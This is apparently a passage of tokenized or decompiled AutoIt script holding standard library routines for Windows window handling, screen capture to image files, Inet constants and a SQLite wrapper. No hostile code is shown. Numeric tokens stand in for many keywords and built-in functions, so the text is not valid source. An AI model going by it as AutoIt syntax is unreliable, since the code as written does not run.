32_WINAPI_CREATEWINDOWEX($IEXSTYLE,$SCLASS,$SNAME,$ISTYLE,$IX,$IY,$IWIDTH,$IHEIGHT,$HPARENT,$HMENU=0,$HINSTANCE=0,$PPARAM=0)
4$HINSTANCE=05$HINSTANCE=_WINAPI_GETMODULEHANDLE("")
28$ARESULT=58("user32.dll","hwnd","CreateWindowExW","dword",$IEXSTYLE,"wstr",$SCLASS,"wstr",$SNAME,"dword",$ISTYLE,"int",$IX,"int",$IY,"int",$IWIDTH,"int",$IHEIGHT,"hwnd",$HPARENT,"handle",$HMENU,"handle",$HINSTANCE,"struct*",$PPARAM)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETCLIENTRECT($HWND)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","GetClientRect","hwnd",$HWND,"struct*",$TRECT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TRECT
33
32_WINAPI_GETDESKTOPWINDOW()
28$ARESULT=58("user32.dll","hwnd","GetDesktopWindow")
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_DESTROYWINDOW($HWND)
28$ARESULT=58("user32.dll","bool","DestroyWindow","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_ENABLEWINDOW($HWND,$BENABLE=39)
28$ARESULT=58("user32.dll","bool","EnableWindow","hwnd",$HWND,"bool",$BENABLE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_ENUMWINDOWS($BVISIBLE=39,$HWND=41)
__WINAPI_ENUMWINDOWSINIT()
4$HWND=415$HWND=_WINAPI_GETDESKTOPWINDOW()
__WINAPI_ENUMWINDOWSCHILD($HWND,$BVISIBLE)
34$__G_AWINLIST_WINAPI
33
32_WINAPI_ENUMWINDOWSPOPUP()
__WINAPI_ENUMWINDOWSINIT()
28$HWND=_WINAPI_GETWINDOW(_WINAPI_GETDESKTOPWINDOW(),$GW_CHILD)
28$SCLASS
9$HWND<>0
4_WINAPI_ISWINDOWVISIBLE($HWND)5
$SCLASS=_WINAPI_GETCLASSNAME($HWND)
4$SCLASS="#32768"5
__WINAPI_ENUMWINDOWSADD($HWND)
7$SCLASS="ToolbarWindow32"5
__WINAPI_ENUMWINDOWSADD($HWND)
7$SCLASS="ToolTips_Class32"5
__WINAPI_ENUMWINDOWSADD($HWND)
7$SCLASS="BaseBar"5
__WINAPI_ENUMWINDOWSCHILD($HWND)
8
8
$HWND=_WINAPI_GETWINDOW($HWND,$GW_HWNDNEXT)
10
34$__G_AWINLIST_WINAPI
33
32_WINAPI_ENUMWINDOWSTOP()
__WINAPI_ENUMWINDOWSINIT()
28$HWND=_WINAPI_GETWINDOW(_WINAPI_GETDESKTOPWINDOW(),$GW_CHILD)
9$HWND<>0
4_WINAPI_ISWINDOWVISIBLE($HWND)5__WINAPI_ENUMWINDOWSADD($HWND)
$HWND=_WINAPI_GETWINDOW($HWND,$GW_HWNDNEXT)
10
34$__G_AWINLIST_WINAPI
33
32_WINAPI_GETCLASSNAME($HWND)
43226($HWND)5$HWND=159($HWND)
28$ARESULT=58("user32.dll","int","GetClassNameW","hwnd",$HWND,"wstr","","int",4096)
4@ERROR23$ARESULT[0]534287(@ERROR,@EXTENDED,"")
34288($ARESULT[0],$ARESULT[2])
33
32_WINAPI_GETFOCUS()
28$ARESULT=58("user32.dll","hwnd","GetFocus")
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETPARENT($HWND)
28$ARESULT=58("user32.dll","hwnd","GetParent","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETSYSCOLOR($IINDEX)
28$ARESULT=58("user32.dll","INT","GetSysColor","int",$IINDEX)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETSYSTEMMETRICS($IINDEX)
28$ARESULT=58("user32.dll","int","GetSystemMetrics","int",$IINDEX)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETWINDOW($HWND,$ICMD)
28$ARESULT=58("user32.dll","hwnd","GetWindow","hwnd",$HWND,"uint",$ICMD)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETWINDOWHEIGHT($HWND)
28$TRECT=_WINAPI_GETWINDOWRECT($HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
3466($TRECT,"Bottom")-66($TRECT,"Top")
33
32_WINAPI_GETWINDOWLONG($HWND,$IINDEX)
28$SFUNCNAME="GetWindowLongW"
4@AUTOITX645$SFUNCNAME="GetWindowLongPtrW"
28$ARESULT=58("user32.dll","long_ptr",$SFUNCNAME,"hwnd",$HWND,"int",$IINDEX)
4@ERROR23$ARESULT[0]534287(@ERROR+10,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_GETWINDOWRECT($HWND)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","GetWindowRect","hwnd",$HWND,"struct*",$TRECT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TRECT
33
32_WINAPI_GETWINDOWTEXT($HWND)
28$ARESULT=58("user32.dll","int","GetWindowTextW","hwnd",$HWND,"wstr","","int",4096)
4@ERROR23$ARESULT[0]534287(@ERROR+10,@EXTENDED,"")
34288($ARESULT[0],$ARESULT[2])
33
32_WINAPI_GETWINDOWTHREADPROCESSID($HWND,36$IPID)
28$ARESULT=58("user32.dll","dword","GetWindowThreadProcessId","hwnd",$HWND,"dword*",0)
4@ERROR534287(@ERROR,@EXTENDED,0)
$IPID=$ARESULT[2]
34$ARESULT[0]
33
32_WINAPI_GETWINDOWWIDTH($HWND)
28$TRECT=_WINAPI_GETWINDOWRECT($HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
3466($TRECT,"Right")-66($TRECT,"Left")
33
32_WINAPI_INPROCESS($HWND,36$HLASTWND)
4$HWND=$HLASTWND53439
13$II=$__G_AINPROCESS_WINAPI[0][0]15116-1
4$HWND=$__G_AINPROCESS_WINAPI[$II][0]5
4$__G_AINPROCESS_WINAPI[$II][1]5
$HLASTWND=$HWND
3439
6
3440
8
8
14
28$IPID
_WINAPI_GETWINDOWTHREADPROCESSID($HWND,$IPID)
28$ICOUNT=$__G_AINPROCESS_WINAPI[0][0]+1
4$ICOUNT>=645$ICOUNT=1
$__G_AINPROCESS_WINAPI[0][0]=$ICOUNT
$__G_AINPROCESS_WINAPI[$ICOUNT][0]=$HWND
$__G_AINPROCESS_WINAPI[$ICOUNT][1]=($IPID=@AUTOITPID)
34$__G_AINPROCESS_WINAPI[$ICOUNT][1]
33
32_WINAPI_INVALIDATERECT($HWND,$TRECT=0,$BERASE=39)
28$ARESULT=58("user32.dll","bool","InvalidateRect","hwnd",$HWND,"struct*",$TRECT,"bool",$BERASE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_ISCLASSNAME($HWND,$SCLASSNAME)
28$SSEPARATOR=258("GUIDataSeparatorChar")
28$ACLASSNAME=331($SCLASSNAME,$SSEPARATOR)
43226($HWND)5$HWND=159($HWND)
28$SCLASSCHECK=_WINAPI_GETCLASSNAME($HWND)
13$X=115369($ACLASSNAME)-1
4338(325($SCLASSCHECK,1,323($ACLASSNAME[$X])))=338($ACLASSNAME[$X])53439
14
3440
33
32_WINAPI_ISWINDOW($HWND)
28$ARESULT=58("user32.dll","bool","IsWindow","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_ISWINDOWVISIBLE($HWND)
28$ARESULT=58("user32.dll","bool","IsWindowVisible","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_MOVEWINDOW($HWND,$IX,$IY,$IWIDTH,$IHEIGHT,$BREPAINT=39)
28$ARESULT=58("user32.dll","bool","MoveWindow","hwnd",$HWND,"int",$IX,"int",$IY,"int",$IWIDTH,"int",$IHEIGHT,"bool",$BREPAINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SETFOCUS($HWND)
28$ARESULT=58("user32.dll","hwnd","SetFocus","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_SETFONT($HWND,$HFONT,$BREDRAW=39)
_SENDMESSAGE($HWND,$__WINAPICONSTANT_WM_SETFONT,$HFONT,$BREDRAW,0,"hwnd")
33
32_WINAPI_SETPARENT($HWNDCHILD,$HWNDPARENT)
28$ARESULT=58("user32.dll","hwnd","SetParent","hwnd",$HWNDCHILD,"hwnd",$HWNDPARENT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARESULT[0]
33
32_WINAPI_SETWINDOWPOS($HWND,$HAFTER,$IX,$IY,$ICX,$ICY,$IFLAGS)
28$ARESULT=58("user32.dll","bool","SetWindowPos","hwnd",$HWND,"hwnd",$HAFTER,"int",$IX,"int",$IY,"int",$ICX,"int",$ICY,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SETWINDOWTEXT($HWND,$STEXT)
28$ARESULT=58("user32.dll","bool","SetWindowTextW","hwnd",$HWND,"wstr",$STEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SHOWWINDOW($HWND,$ICMDSHOW=5)
28$ARESULT=58("user32.dll","bool","ShowWindow","hwnd",$HWND,"int",$ICMDSHOW)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_UPDATEWINDOW($HWND)
28$ARESULT=58("user32.dll","bool","UpdateWindow","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32__WINAPI_ENUMWINDOWSADD($HWND,$SCLASS="")
4$SCLASS=""5$SCLASS=_WINAPI_GETCLASSNAME($HWND)
$__G_AWINLIST_WINAPI[0][0]+=1
28$ICOUNT=$__G_AWINLIST_WINAPI[0][0]
4$ICOUNT>=$__G_AWINLIST_WINAPI[0][1]5
27$__G_AWINLIST_WINAPI[$ICOUNT+64][2]
$__G_AWINLIST_WINAPI[0][1]+=64
8
$__G_AWINLIST_WINAPI[$ICOUNT][0]=$HWND
$__G_AWINLIST_WINAPI[$ICOUNT][1]=$SCLASS
33
32__WINAPI_ENUMWINDOWSCHILD($HWND,$BVISIBLE=39)
$HWND=_WINAPI_GETWINDOW($HWND,$GW_CHILD)
9$HWND<>0
4(3$BVISIBLE)2_WINAPI_ISWINDOWVISIBLE($HWND)5
__WINAPI_ENUMWINDOWSADD($HWND)
__WINAPI_ENUMWINDOWSCHILD($HWND,$BVISIBLE)
8
$HWND=_WINAPI_GETWINDOW($HWND,$GW_HWNDNEXT)
10
33
32__WINAPI_ENUMWINDOWSINIT()
27$__G_AWINLIST_WINAPI[64][2]
$__G_AWINLIST_WINAPI[0][0]=0
$__G_AWINLIST_WINAPI[0][1]=64
33
29$__G_IBMPFORMAT=$GDIP_PXF24RGB
29$__G_IJPGQUALITY=100
29$__G_ITIFCOLORDEPTH=24
29$__G_ITIFCOMPRESSION=$GDIP_EVTCOMPRESSIONLZW
2930$__SCREENCAPTURECONSTANT_SM_CXSCREEN=0
2930$__SCREENCAPTURECONSTANT_SM_CYSCREEN=1
2930$__SCREENCAPTURECONSTANT_SRCCOPY=13369376
32_SCREENCAPTURE_CAPTURE($SFILENAME="",$ILEFT=0,$ITOP=0,$IRIGHT=-1,$IBOTTOM=-1,$BCURSOR=39)
28$BRET=40
4$IRIGHT=-15$IRIGHT=_WINAPI_GETSYSTEMMETRICS($__SCREENCAPTURECONSTANT_SM_CXSCREEN)-1
4$IBOTTOM=-15$IBOTTOM=_WINAPI_GETSYSTEMMETRICS($__SCREENCAPTURECONSTANT_SM_CYSCREEN)-1
4$IRIGHT<$ILEFT534287(-1,0,$BRET)
4$IBOTTOM<$ITOP534287(-2,0,$BRET)
28$IW=($IRIGHT-$ILEFT)+1
28$IH=($IBOTTOM-$ITOP)+1
28$HWND=_WINAPI_GETDESKTOPWINDOW()
28$HDDC=_WINAPI_GETDC($HWND)
28$HCDC=_WINAPI_CREATECOMPATIBLEDC($HDDC)
28$HBMP=_WINAPI_CREATECOMPATIBLEBITMAP($HDDC,$IW,$IH)
_WINAPI_SELECTOBJECT($HCDC,$HBMP)
_WINAPI_BITBLT($HCDC,0,0,$IW,$IH,$HDDC,$ILEFT,$ITOP,$__SCREENCAPTURECONSTANT_SRCCOPY)
4$BCURSOR5
28$ACURSOR=_WINAPI_GETCURSORINFO()
43@ERROR1$ACURSOR[1]5
$BCURSOR=39
28$HICON=_WINAPI_COPYICON($ACURSOR[2])
28$AICON=_WINAPI_GETICONINFO($HICON)
43@ERROR5
_WINAPI_DELETEOBJECT($AICON[4])
4$AICON[5]<>05_WINAPI_DELETEOBJECT($AICON[5])
_WINAPI_DRAWICON($HCDC,$ACURSOR[3]-$AICON[2]-$ILEFT,$ACURSOR[4]-$AICON[3]-$ITOP,$HICON)
8
_WINAPI_DESTROYICON($HICON)
8
8
_WINAPI_RELEASEDC($HWND,$HDDC)
_WINAPI_DELETEDC($HCDC)
4$SFILENAME=""534$HBMP
$BRET=_SCREENCAPTURE_SAVEIMAGE($SFILENAME,$HBMP,39)
34287(@ERROR,@EXTENDED,$BRET)
33
32_SCREENCAPTURE_CAPTUREWND($SFILENAME,$HWND,$ILEFT=0,$ITOP=0,$IRIGHT=-1,$IBOTTOM=-1,$BCURSOR=39)
43226($HWND)5$HWND=386($HWND)
28$TRECT=65($TAGRECT)
2830$DWMWA_EXTENDED_FRAME_BOUNDS=9
28$BRET=58("dwmapi.dll","long","DwmGetWindowAttribute","hwnd",$HWND,"dword",$DWMWA_EXTENDED_FRAME_BOUNDS,"struct*",$TRECT,"dword",68($TRECT))
4(@ERROR2$BRET[0]2(0(66($TRECT,"Left"))+0(66($TRECT,"Top"))+0(66($TRECT,"Right"))+0(66($TRECT,"Bottom")))=0)5
$TRECT=_WINAPI_GETWINDOWRECT($HWND)
4@ERROR534287(@ERROR+10,@EXTENDED,40)
8
$ILEFT+=66($TRECT,"Left")
$ITOP+=66($TRECT,"Top")
4$IRIGHT=-15$IRIGHT=66($TRECT,"Right")-66($TRECT,"Left")-1
4$IBOTTOM=-15$IBOTTOM=66($TRECT,"Bottom")-66($TRECT,"Top")-1
$IRIGHT+=66($TRECT,"Left")
$IBOTTOM+=66($TRECT,"Top")
4$ILEFT>66($TRECT,"Right")5$ILEFT=66($TRECT,"Left")
4$ITOP>66($TRECT,"Bottom")5$ITOP=66($TRECT,"Top")
4$IRIGHT>66($TRECT,"Right")5$IRIGHT=66($TRECT,"Right")-1
4$IBOTTOM>66($TRECT,"Bottom")5$IBOTTOM=66($TRECT,"Bottom")-1
$BRET=_SCREENCAPTURE_CAPTURE($SFILENAME,$ILEFT,$ITOP,$IRIGHT,$IBOTTOM,$BCURSOR)
34287(@ERROR,@EXTENDED,$BRET)
33
32_SCREENCAPTURE_SAVEIMAGE($SFILENAME,$HBITMAP,$BFREEBMP=39)
_GDIPLUS_STARTUP()
4@ERROR534287(-1,-1,40)
28$SEXT=338(__GDIPLUS_EXTRACTFILEEXT($SFILENAME))
28$SCLSID=_GDIPLUS_ENCODERSGETCLSID($SEXT)
4$SCLSID=""534287(-2,-2,40)
28$HIMAGE=_GDIPLUS_BITMAPCREATEFROMHBITMAP($HBITMAP)
4@ERROR534287(-3,-3,40)
28$TDATA,$TPARAMS
23$SEXT
21"BMP"
28$IX=_GDIPLUS_IMAGEGETWIDTH($HIMAGE)
28$IY=_GDIPLUS_IMAGEGETHEIGHT($HIMAGE)
28$HCLONE=_GDIPLUS_BITMAPCLONEAREA($HIMAGE,0,0,$IX,$IY,$__G_IBMPFORMAT)
_GDIPLUS_IMAGEDISPOSE($HIMAGE)
$HIMAGE=$HCLONE
21"JPG","JPEG"
$TPARAMS=_GDIPLUS_PARAMINIT(1)
$TDATA=65("int Quality")
69($TDATA,"Quality",$__G_IJPGQUALITY)
_GDIPLUS_PARAMADD($TPARAMS,$GDIP_EPGQUALITY,1,$GDIP_EPTLONG,67($TDATA))
21"TIF","TIFF"
$TPARAMS=_GDIPLUS_PARAMINIT(2)
$TDATA=65("int ColorDepth;int Compression")
69($TDATA,"ColorDepth",$__G_ITIFCOLORDEPTH)
69($TDATA,"Compression",$__G_ITIFCOMPRESSION)
_GDIPLUS_PARAMADD($TPARAMS,$GDIP_EPGCOLORDEPTH,1,$GDIP_EPTLONG,67($TDATA,"ColorDepth"))
_GDIPLUS_PARAMADD($TPARAMS,$GDIP_EPGCOMPRESSION,1,$GDIP_EPTLONG,67($TDATA,"Compression"))
24
28$PPARAMS=0
4223($TPARAMS)5$PPARAMS=$TPARAMS
28$BRET=_GDIPLUS_IMAGESAVETOFILEEX($HIMAGE,$SFILENAME,$SCLSID,$PPARAMS)
_GDIPLUS_IMAGEDISPOSE($HIMAGE)
4$BFREEBMP5_WINAPI_DELETEOBJECT($HBITMAP)
_GDIPLUS_SHUTDOWN()
34287($BRET=40,0,$BRET)
33
32_SCREENCAPTURE_SETBMPFORMAT($IFORMAT)
23$IFORMAT
210
$__G_IBMPFORMAT=$GDIP_PXF16RGB555
211
$__G_IBMPFORMAT=$GDIP_PXF16RGB565
212
$__G_IBMPFORMAT=$GDIP_PXF24RGB
213
$__G_IBMPFORMAT=$GDIP_PXF32RGB
214
$__G_IBMPFORMAT=$GDIP_PXF32ARGB
216
$__G_IBMPFORMAT=$GDIP_PXF24RGB
24
33
32_SCREENCAPTURE_SETJPGQUALITY($IQUALITY)
4$IQUALITY<05$IQUALITY=0
4$IQUALITY>1005$IQUALITY=100
$__G_IJPGQUALITY=$IQUALITY
33
32_SCREENCAPTURE_SETTIFCOLORDEPTH($IDEPTH)
23$IDEPTH
2124
$__G_ITIFCOLORDEPTH=24
2132
$__G_ITIFCOLORDEPTH=32
216
$__G_ITIFCOLORDEPTH=0
24
33
32_SCREENCAPTURE_SETTIFCOMPRESSION($ICOMPRESS)
23$ICOMPRESS
211
$__G_ITIFCOMPRESSION=$GDIP_EVTCOMPRESSIONNONE
212
$__G_ITIFCOMPRESSION=$GDIP_EVTCOMPRESSIONLZW
216
$__G_ITIFCOMPRESSION=0
24
33
2930$INET_LOCALCACHE=0
2930$INET_FORCERELOAD=1
2930$INET_IGNORESSL=2
2930$INET_ASCIITRANSFER=4
2930$INET_BINARYTRANSFER=8
2930$INET_FORCEBYPASS=16
2930$INET_DOWNLOADWAIT=0
2930$INET_DOWNLOADBACKGROUND=1
2930$INET_DOWNLOADREAD=0
2930$INET_DOWNLOADSIZE=1
2930$INET_DOWNLOADCOMPLETE=2
2930$INET_DOWNLOADSUCCESS=3
2930$INET_DOWNLOADERROR=4
2930$INET_DOWNLOADEXTENDED=5
29$__G_HDLL_SQLITE=0
29$__G_HDB_SQLITE=0
29$__G_BUTF8ERRORMSG_SQLITE=40
29$__G_HPRINTCALLBACK_SQLITE=__SQLITE_CONSOLEWRITE
29$__G_BSAFEMODESTATE_SQLITE=39
29$__G_AHDBS_SQLITE[1]=[""]
29$__G_AHQUERYS_SQLITE[1]=[""]
29$__G_HMSVCRTDLL_SQLITE=0
2930$SQLITE_OK=0
2930$SQLITE_ERROR=1
2930$SQLITE_INTERNAL=2
2930$SQLITE_PERM=3
2930$SQLITE_ABORT=4
2930$SQLITE_BUSY=5
2930$SQLITE_LOCKED=6
2930$SQLITE_NOMEM=7
2930$SQLITE_READONLY=8
2930$SQLITE_INTERRUPT=9
2930$SQLITE_IOERR=10
2930$SQLITE_CORRUPT=11
2930$SQLITE_NOTFOUND=12
2930$SQLITE_FULL=13
2930$SQLITE_CANTOPEN=14
2930$SQLITE_PROTOCOL=15
2930$SQLITE_EMPTY=16
2930$SQLITE_SCHEMA=17
2930$SQLITE_TOOBIG=18
2930$SQLITE_CONSTRAINT=19
2930$SQLITE_MISMATCH=20
2930$SQLITE_MISUSE=21
2930$SQLITE_NOLFS=22
2930$SQLITE_AUTH=23
2930$SQLITE_ROW=100
2930$SQLITE_DONE=101
2930$SQLITE_OPEN_READONLY=1
2930$SQLITE_OPEN_READWRITE=2
2930$SQLITE_OPEN_CREATE=4
2930$SQLITE_ENCODING_UTF8=0
2930$SQLITE_ENCODING_UTF16=1
2930$SQLITE_ENCODING_UTF16BE=2
2930$SQLITE_TYPE_INTEGER=1
2930$SQLITE_TYPE_FLOAT=2
2930$SQLITE_TYPE_TEXT=3
2930$SQLITE_TYPE_BLOB=4
2930$SQLITE_TYPE_NULL=5
32_SQLITE_STARTUP($SDLL_FILENAME="",$BUTF8ERRORMSG=40,$IFORCELOCAL=0,$HPRINTCALLBACK=$__G_HPRINTCALLBACK_SQLITE)
4$SDLL_FILENAME=412$SDLL_FILENAME=-15$SDLL_FILENAME=""
4$HPRINTCALLBACK=415$HPRINTCALLBACK=__SQLITE_CONSOLEWRITE
$__G_HPRINTCALLBACK_SQLITE=$HPRINTCALLBACK
4$BUTF8ERRORMSG=415$BUTF8ERRORMSG=40
$__G_BUTF8ERRORMSG_SQLITE=$BUTF8ERRORMSG
4$SDLL_FILENAME=""5$SDLL_FILENAME="sqlite3.dll"
4@AUTOITX641(311($SDLL_FILENAME,"_x64")=0)5$SDLL_FILENAME=328($SDLL_FILENAME,".dll","_x64.dll")
28$IEXTENDED=0
4$IFORCELOCAL<15
$SDLL_FILENAME=__SQLITE_GETDOWNLOADEDPATH($SDLL_FILENAME)&$SDLL_FILENAME
$IEXTENDED=@EXTENDED
8
28$HDLL=64($SDLL_FILENAME)
4$HDLL=-15
$__G_HDLL_SQLITE=0
34287(1,$IEXTENDED,"")
6
$__G_HDLL_SQLITE=$HDLL
34288($IEXTENDED,$SDLL_FILENAME)
8
33
32_SQLITE_SHUTDOWN()
4$__G_HDLL_SQLITE>0563($__G_HDLL_SQLITE)
$__G_HDLL_SQLITE=0
4$__G_HMSVCRTDLL_SQLITE>0563($__G_HMSVCRTDLL_SQLITE)
$__G_HMSVCRTDLL_SQLITE=0
33
32_SQLITE_OPEN($SDATABASE_FILENAME=41,$IACCESSMODE=41,$IENCODING=41)
43$__G_HDLL_SQLITE534287(3,$SQLITE_MISUSE,0)
4$SDATABASE_FILENAME=4123233($SDATABASE_FILENAME)5$SDATABASE_FILENAME=":memory:"
28$TFILENAME=__SQLITE_STRINGTOUTF8STRUCT($SDATABASE_FILENAME)
4@ERROR534287(2,@ERROR,0)
4$IACCESSMODE=415$IACCESSMODE=19($SQLITE_OPEN_READWRITE,$SQLITE_OPEN_CREATE)
28$BOLDBASE=95($SDATABASE_FILENAME)
4$IENCODING=415
$IENCODING=$SQLITE_ENCODING_UTF8
8
28$AVRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_open_v2","struct*",$TFILENAME,"ptr*",0,"int",$IACCESSMODE,"ptr",0)
4@ERROR534287(1,@ERROR,0)
4$AVRVAL[0]<>$SQLITE_OK5
__SQLITE_REPORTERROR($AVRVAL[2],"_SQLite_Open")
_SQLITE_CLOSE($AVRVAL[2])
34287(-1,$AVRVAL[0],0)
8
$__G_HDB_SQLITE=$AVRVAL[2]
__SQLITE_HADD($__G_AHDBS_SQLITE,$AVRVAL[2])
43$BOLDBASE5
28$AENCODING[3]=["8","16","16be"]
_SQLITE_EXEC($AVRVAL[2],'PRAGMA encoding="UTF-'&$AENCODING[$IENCODING]&'";')
8
34288($AVRVAL[0],$AVRVAL[2])
33
32_SQLITE_GETTABLE($HDB,$SSQL,36$ARESULT,36$IROWS,36$ICOLUMNS,$ICHARSIZE=-1)
$ARESULT=""
4__SQLITE_HCHK($HDB,1)534287(@ERROR,0,$SQLITE_MISUSE)
4$ICHARSIZE=""2$ICHARSIZE<12$ICHARSIZE=415$ICHARSIZE=-1
28$HQUERY
28$R=_SQLITE_QUERY($HDB,$SSQL,$HQUERY)
4@ERROR534287(2,@ERROR,$R)
28$ADATAROW
$R=_SQLITE_FETCHNAMES($HQUERY,$ADATAROW)
28$IERROR=@ERROR
4$IERROR5
_SQLITE_QUERYFINALIZE($HQUERY)
34287(3,$IERROR,$R)
8
$ICOLUMNS=369($ADATAROW)
2830$IROWSINCR=64
$IROWS=0
28$IALLOCROWS=$IROWSINCR
26$ARESULT[($IALLOCROWS+1)*$ICOLUMNS+1]
13$IDX=015$ICOLUMNS-1
4$ICHARSIZE>05
$ADATAROW[$IDX]=322($ADATAROW[$IDX],$ICHARSIZE)
8
$ARESULT[$IDX+1]=$ADATAROW[$IDX]
14
91
$R=_SQLITE_FETCHDATA($HQUERY,$ADATAROW,0,0,$ICOLUMNS)
$IERROR=@ERROR
23$R
21$SQLITE_OK
$IROWS+=1
4$IROWS=$IALLOCROWS5
$IALLOCROWS=280($IALLOCROWS*4/3)
27$ARESULT[($IALLOCROWS+1)*$ICOLUMNS+1]
8
13$J=015$ICOLUMNS-1
4$ICHARSIZE>05
$ADATAROW[$J]=322($ADATAROW[$J],$ICHARSIZE)
8
$IDX+=1
$ARESULT[$IDX]=$ADATAROW[$J]
14
21$SQLITE_DONE
18
216
$ARESULT=""
_SQLITE_QUERYFINALIZE($HQUERY)
34287(4,$IERROR,$R)
24
10
$ARESULT[0]=($IROWS+1)*$ICOLUMNS
27$ARESULT[$ARESULT[0]+1]
34($SQLITE_OK)
33
32_SQLITE_EXEC($HDB,$SSQL,$SCALLBACK="")
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
4$SCALLBACK<>""5
28$IROWS,$ICOLUMNS
28$ARESULT="SQLITE_CALLBACK:"&$SCALLBACK
28$IRVAL=_SQLITE_GETTABLE2D($HDB,$SSQL,$ARESULT,$IROWS,$ICOLUMNS)
4@ERROR534287(3,@ERROR,$IRVAL)
34$IRVAL
8
28$TSQL8=__SQLITE_STRINGTOUTF8STRUCT($SSQL)
4@ERROR534287(4,@ERROR,0)
28$AVRVAL=58($__G_HDLL_SQLITE,"int:cdecl","sqlite3_exec","ptr",$HDB,"struct*",$TSQL8,"ptr",0,"ptr",0,"ptr*",0)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
__SQLITE_SZFREE($AVRVAL[5])
4$AVRVAL[0]<>$SQLITE_OK5
__SQLITE_REPORTERROR($HDB,"_SQLite_Exec",$SSQL)
287(-1)
8
34$AVRVAL[0]
33
32_SQLITE_LIBVERSION()
4$__G_HDLL_SQLITE=0534287(1,$SQLITE_MISUSE,0)
28$R=58($__G_HDLL_SQLITE,"str:cdecl","sqlite3_libversion")
4@ERROR534287(1,@ERROR,0)
34$R[0]
33
32_SQLITE_LASTINSERTROWID($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,@EXTENDED,0)
28$R=58($__G_HDLL_SQLITE,"long:cdecl","sqlite3_last_insert_rowid","ptr",$HDB)
4@ERROR534287(1,@ERROR,0)
34$R[0]
33
32_SQLITE_CHANGES($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,@EXTENDED,0)
28$R=58($__G_HDLL_SQLITE,"long:cdecl","sqlite3_changes","ptr",$HDB)
4@ERROR534287(1,@ERROR,0)
34$R[0]
33
32_SQLITE_TOTALCHANGES($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,@EXTENDED,0)
28$R=58($__G_HDLL_SQLITE,"long:cdecl","sqlite3_total_changes","ptr",$HDB)
4@ERROR534287(1,@ERROR,0)
34$R[0]
33
32_SQLITE_ERRCODE($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,0,$SQLITE_MISUSE)
28$R=58($__G_HDLL_SQLITE,"long:cdecl","sqlite3_errcode","ptr",$HDB)
4@ERROR534287(1,@ERROR,$SQLITE_MISUSE)
34$R[0]
33
32_SQLITE_ERRMSG($HDB=-1)
4__SQLITE_HCHK($HDB,2)534287(@ERROR,@EXTENDED,"Library used incorrectly")
28$R=58($__G_HDLL_SQLITE,"wstr:cdecl","sqlite3_errmsg16","ptr",$HDB)
4@ERROR5
__SQLITE_REPORTERROR($HDB,"_SQLite_ErrMsg",41,"Call Failed")
34287(1,@ERROR,"Library used incorrectly")
8
34$R[0]
33
32_SQLITE_DISPLAY2DRESULT($ARESULT,$ICELLWIDTH=0,$BRETURN=40)
43219($ARESULT)2369($ARESULT,$UBOUND_DIMENSIONS)<>22$ICELLWIDTH<0534287(1,0,"")
28$AICELLWIDTH
4$ICELLWIDTH=02$ICELLWIDTH=415
28$ICELLWIDTHMAX
26$AICELLWIDTH[369($ARESULT,$UBOUND_COLUMNS)]
13$IROW=015369($ARESULT,$UBOUND_ROWS)-1
13$ICOL=015369($ARESULT,$UBOUND_COLUMNS)-1
$ICELLWIDTHMAX=323($ARESULT[$IROW][$ICOL])
4$ICELLWIDTHMAX>$AICELLWIDTH[$ICOL]5
$AICELLWIDTH[$ICOL]=$ICELLWIDTHMAX
8
14
14
8
28$SOUT="",$ICELLWIDTHUSED
13$IROW=015369($ARESULT,$UBOUND_ROWS)-1
13$ICOL=015369($ARESULT,$UBOUND_COLUMNS)-1
4$ICELLWIDTH=05
$ICELLWIDTHUSED=$AICELLWIDTH[$ICOL]
6
$ICELLWIDTHUSED=$ICELLWIDTH
8
$SOUT&=309(" %-"&$ICELLWIDTHUSED&"."&$ICELLWIDTHUSED&"s ",$ARESULT[$IROW][$ICOL])
14
$SOUT&=@CRLF
43$BRETURN5
__SQLITE_PRINT($SOUT)
$SOUT=""
8
14
4$BRETURN534$SOUT
33
